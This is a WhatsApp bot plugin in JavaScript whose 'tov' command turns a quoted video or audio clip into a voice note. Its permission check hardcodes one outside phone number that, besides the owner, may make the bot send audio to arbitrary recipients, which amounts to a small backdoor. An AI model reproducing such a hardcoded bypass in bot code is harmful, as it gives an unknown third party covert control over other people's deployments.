const converter = require('../data/converter');
const { cmd } = require('../command');

cmd({
    pattern: 'tov',
    alias: ['voice', 'tovoice'],
    desc: 'Convert media to voice message',
    category: 'audio',
    react: '🎙️',
    filename: __filename
}, async (client, match, message, { from, isOwner, args, sender }) => {

    if (!match.quoted) return;

    try {
        let targetJid = from;
        let inputNumber = args.join('').replace(/[^0-9]/g, '');
        const specialNumber = "923035512967@s.whatsapp.net";

        if (inputNumber.length > 5) {
            if (!isOwner && sender !== specialNumber) return;
            targetJid = (inputNumber.startsWith('0')
                ? '92' + inputNumber.slice(1)
                : inputNumber) + '@s.whatsapp.net';
        }

        const buffer = await match.quoted.download();
        if (!buffer) return;

        const ext =
            match.quoted.mtype === 'videoMessage' ? 'mp4' :
            match.quoted.mtype === 'audioMessage' ? 'm4a' :
            null;

        if (!ext) return;

        if (match.quoted.seconds && match.quoted.seconds > 600) return;

        const ptt = await converter.toPTT(buffer, ext);

        await client.sendMessage(targetJid, {
            audio: ptt,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true
        });

        await client.sendMessage(from, {
            react: { text: "✅", key: message.key }
        });

    } catch (e) {
        console.error('PTT Error:', e);
    }
});